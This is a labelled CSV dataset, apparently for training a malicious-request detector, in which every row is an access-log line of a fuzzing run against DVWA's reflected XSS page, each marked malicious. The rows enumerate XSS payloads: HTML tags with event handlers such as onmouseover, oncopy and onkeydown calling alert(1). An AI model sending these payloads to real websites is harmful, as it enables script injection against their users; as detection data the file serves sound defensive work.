url,malicious
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onclick=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot oncontextmenu=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot ondblclick=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmousedown=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmouseenter=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmouseleave=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmousemove=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmouseout=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmouseover=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onmouseup=\""alert(1)\"">test</tfoot>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<tfoot onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onclick=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th oncontextmenu=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th ondblclick=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onmousedown=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onmouseenter=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onmouseleave=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onmousemove=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onmouseout=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onmouseover=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onmouseup=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onclick=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead oncontextmenu=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead ondblclick=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onmousedown=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onmouseenter=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onmouseleave=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onmousemove=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onmouseout=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onmouseover=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onmouseup=\""alert(1)\"">test</thead>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onclick=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time oncontextmenu=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time ondblclick=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onmousedown=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onmouseenter=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onmouseleave=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onmousemove=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onmouseout=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onmouseover=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onmouseup=\""alert(1)\"">test</time>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<time onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onclick=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title oncontextmenu=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title ondblclick=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onmousedown=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onmouseenter=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onmouseleave=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onmousemove=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onmouseout=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onmouseover=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title onmouseup=\""alert(1)\"">test</title>"" 400 0 ""-"" ""-""",1
